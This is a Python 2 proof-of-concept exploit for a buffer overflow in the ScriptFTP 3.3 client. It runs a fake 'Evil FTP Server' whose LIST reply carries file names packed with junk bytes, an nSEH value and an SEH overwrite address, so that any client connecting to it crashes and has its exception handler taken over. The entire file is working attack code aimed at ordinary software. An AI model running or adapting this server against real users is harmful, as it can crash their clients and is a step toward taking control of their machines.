import socket
import os


class ftp_server:
    def __init__(self):
        self.host = '0.0.0.0'
        self.passive_port = 7214
        self.log("""\n
[*] ScriptFTP 3.3 Buffer Overflow POC
[*] by modpr0be[at]digital-echidna[dot]org.
[*] thanks a lot for cyb3r|anbu :)
=============================================
[*] Evil FTP Server Ready""")

        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.bind(('', 21))
        self.sock.listen(1)

        a = self.passive_port/256
        b = self.passive_port%256
        self.tuple_port = (a, b)
        self.host_join = ','.join(self.host.split('.'))
        self.passive = False

        self.log("[+] Server initiated.")

    def log(self, msg):
        print msg

    def get(self):
        return self.conn.recv(1024).replace('\r', '').replace('\n', '')

    def getcwd(self):
        return os.getcwd().split(chr(92))[-1]

    def put(self, ftr):
        x = {

            150:" Data connection accepted from %s:%s; transfer starting.\r\n226 Listing completed."%(self.host, self.passive_port),
            200:" Type okay.",
            220:" %s Server is ready."%self.host,
            226:" Listing completed.",
            227:" Entering Passive Mode (%s,%s,%s)"%(self.host_join, self.tuple_port[0], self.tuple_port[1]),
            230:" User logged in, proceed.",
            250:' "/%s" is new cwd.'%self.getcwd(), 
            257:' "/%s" is cwd.'%self.getcwd(),
            331:" User name okay, need password.",
            502:" Command not implemented.",
            551:" Requested action aborted. Page type unknown." 
            
                   }[ftr]

        s = '%s%s\r\n'%(ftr, x)
        self.conn.send(s)
        return s
   
    def main(self):
        self.log("[+] Awaiting a connection...\n")
        self.conn, addr = self.sock.accept ()
        self.log("[+] Connection created by %s.\n[+] Establishing session."%addr[0])
        self.put(220)
        self.log("\nStarting Instruction Loop.")

        while 1:
            # if self.passive:
            #     try:
            #         data = self.conn2.recv(1024)
            #         print data
            #     except socket.error:
            #         pass 

                
            try: 
                data = self.get().upper()
            except socket.error:
                self.log("\n-- Connection Reset, shutting down FTP.\n ")
                self.conn.close()
                self.sock.shutdown(socket.SHUT_RDWR)
                raise socket.error
                
            self.log(" >>> %s"%data) 

            if data[:4] == 'USER':   s = 331
            elif data[:4] == 'PASS': s = 230
            elif data[:3] == 'PWD':  s = 257
            elif data[:4] == 'TYPE':
                s = 200
                # self.type = data.split(' ')[-1]
            elif data[:4] == 'PASV':
                # create passive port
                self.sock2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock2.bind(('', self.passive_port ))
                self.sock2.listen(1)
                # self.sock2.settimeout(1)
                s = self.put(227)
                self.log(" <<< %s"%s)
                self.log("     [Connecting to passive port %s]"%self.passive_port)
                self.conn2, addr = self.sock2.accept()
                self.passive = True
                self.log("     [Connected]\n") 
                s = 0 # don't routine
      
            elif data[:3] == 'CWD':
                try:
                    os.chdir('..%s'%data.split(' ')[-1])
                    s = 250
                except OSError: 
                    s = 551
            elif data[:4] == 'LIST':
                s = self.put(150)
#                self.log(" <<< %s"%s)

                s = self.passive_do(1)
#                self.log(" >>> %s"%s)

                # s = self.put(226)
                # self.log(" >>> %s"%s)

                # print "<<< "+ self.conn2.recv(1024)

                s = 0 # don't routine
            else:                    s = 502
    
            if s:
                s = self.put(s)
#               self.log(" <<< %s"%s)

    def passive_do(self, id):
        if id == 1:
	    total = 10000	    
	    junk = "A" * 7217		#junk
	    nseh = "\x61\x62"		#nseh
            seh = "\x45\x5B" 		#seh ppr from scriptftp.exe 0x005B0045
            sisa = 'D' * (total - len(junk+nseh+seh))
	    crash = junk+nseh+seh+sisa

            res = """-rwxr-xr-x   5 ftpuser  ftpusers       512 Jul 26  2001 """+crash+""".txt\r\ndrwxr-xr-x   5 ftpuser  ftpusers       512 Jul 26  2001 A\r\nrwxr-xr-x   5 ftpuser  ftpusers       512 Jul 26  2001 """+ crash +".txt\r\n"

        self.conn2.send(res)
        # self.conn2.send('\r\n') # send blank
	return res

                
#while 1:       
#    try:
#        ftp_server().main()
#    except socket.error:
#        print "[!] Rebooting server...\n"
